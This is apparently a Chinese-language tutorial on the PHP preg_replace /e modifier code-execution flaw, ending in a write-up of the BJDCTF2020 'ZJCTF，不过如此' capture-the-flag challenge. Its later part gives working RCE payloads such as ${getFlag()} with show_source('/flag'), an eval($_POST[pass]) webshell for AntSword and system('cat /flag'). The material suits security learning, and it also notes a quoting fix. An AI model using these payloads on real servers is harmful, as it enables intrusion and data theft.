```
preg_replace /e 模式 漏洞分析总结  
---转载请标明来处  
  
先放个原型  
  
preg_replace函数原型：  
  
mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])  
  
如果有对preg_replace不了解的可以查看  
  
https://www.php.net/manual/zh/function.preg-replace.php  
  
模式初识  
/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保  replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。  
  
  
  
给你们个直观的例子  
  
preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str）  
我一开始也不知道 （ /ei ） 是 什么东西  
  
1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个  
2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同  
3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号  
4、/s 与/m相对，单行模式匹配。  
5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。  
6、/x 忽略空白模式。  
明白了/ei是什么，发现 \ \ 1 又不知道是什么了，我又去找了资料  
  
反向引用  
  
对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。  
  
说人话就是，\谁，就匹配第几个  
  
案例  
通常subject参数是由客户端产生的，客户端可能会构造恶意的代码，例如：  
  
<?   
echo preg_replace("/test/e",$_GET["h"],"jutst test");   
?>   
  
  
如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 、  
  
那如果这样呢  
  
<?  
function test($str)  
{  
}  
echo preg_replace("/s*[php](.+?)[/php]s*/ies", 'test("\1")', $_GET["h"]);  
?>   
提交 ?h=[php]phpinfo()[/php]，phpinfo()会被执行吗？  
肯定不会。因为经过正则匹配后， replacement 参数变为'test("phpinfo")'，此时phpinfo仅是被当做一个字符串参数了。  
有没有办法让它执行呢？  
  
有！  
  
在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。为什么呢？  
在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。  
注意：双引号中的函数不会被执行和替换。  
  
那这有没有办法防御呢？  
  
将'test("\1")' 修改为"test('\1')"，这样‘${phpinfo()}'就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。  
总结  
preg_replace \e 模式如果 replacement中是双引号的，那有此漏洞  
  
例题（重要）[BJDCTF2020]ZJCTF，不过如此  
题目前面我就不详讲了，主要就是文件包含伪协议  
  
之后，拿到next.php的源码  
  
<?php  
$id = $_GET['id'];  
$_SESSION['id'] = $id;  
  
function complex($re, $str) {  
    return preg_replace(  
        '/(' . $re . ')/ei',  
        'strtolower("\\1")',  
        $str  
    );  
}  
  
  
foreach($_GET as $re => $str) {  
    echo complex($re, $str). "\n";  
}  
  
function getFlag(){  
@eval($_GET['cmd']);  
}  
foreach函数将参数和参数值分别给了$re和$str，$re作为正则表达式，$str作为要被替换的字符串  
  
要执行上面的漏洞，要正则表达式和字符串匹配起来  
  
于是，playload查看phpinfo  
  
?\S*=${phpinfo()}  
解释一下：\S意思为匹配所有的字符，一定要是大写S，大小写是有区别的  
  
[\s]---表示，只要出现空白就匹配；  
  
[\S]---表示，非空白就匹配；  
后面的值是个变量，能让漏洞执行这个变量，这个再强调一次，只有在双引号包裹的字符串中才可以解析变量，单引号不行  
  
所以要拿到最后flag我目前想到有三种姿势  
  
利用源码给的getFlag函数  
  
playload:?\S*=${getFlag()}&cmd=show_source('/flag');  
2.利用蚁剑getshell  
  
playload:?\S*=${getFlag()}&cmd=eval($_POST[pass]);  
或者  
playload:?\S*=${eval($_POST[pass])}  
3.post传参  
  
playload:\S*=${$_POST[pass]}  
  
post:  
  
pass=system('cat /flag');
```